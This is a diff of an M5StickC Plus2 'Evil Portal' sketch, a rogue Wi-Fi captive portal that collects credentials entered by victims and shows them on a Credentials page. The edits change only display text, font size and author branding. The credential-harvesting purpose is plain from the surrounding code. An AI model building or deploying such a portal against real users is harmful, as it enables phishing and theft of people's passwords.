@@ -11,7 +11,7 @@
 #define POST_TITLE "Account Successfully Registered"
 #define POST_BODY "Please wait while you are being connected...</br>"
 #define PASS_TITLE "Credentials"
-#define CLEAR_TITLE "Turn Off"
+#define CLEAR_TITLE "Passwords Cleared"
  
 int capcount=0;
 int BUILTIN_LED = 10;
@@ -40,7 +40,7 @@ String footer() {
 String header(String t) {
   String a = String(SSID_NAME);
   String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
-               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
+               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 14px; line-height: 24px; margin: 0; padding: 0; }"
                "div { padding: 0.5em; }"
                "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
                "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
@@ -57,7 +57,7 @@ String header(String t) {
 }
  
 String creds() {
-  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
+  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back</a></p><p><a style=\"color:blue\" href=/clear>Clear Passwords</a></p></center>" + footer();
 }
  
 String index() {
@@ -104,7 +104,7 @@ void setup() {
  
   M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
   M5.Lcd.setCursor(5, 15);
-  M5.Lcd.print("M5StickCPlus2 Evil Portal");
+  M5.Lcd.print("*** Evil Portal ***");
  
   M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
   M5.Lcd.setCursor(15, 35);
@@ -118,7 +118,7 @@ void setup() {
 
   M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
   M5.Lcd.setCursor(80, 100);
-  M5.Lcd.print("devildev."); 
+  M5.Lcd.print("CtrlAltDel."); 
  
   bootTime = lastActivity = millis();
   WiFi.mode(WIFI_AP);
@@ -177,7 +177,7 @@ void loop() {
 
     M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
     M5.Lcd.setCursor(80, 100);
-    M5.Lcd.print("devildev."); 
+    M5.Lcd.print("CtrlAltDel."); 
   }
   dnsServer.processNextRequest(); webServer.handleClient();
 }
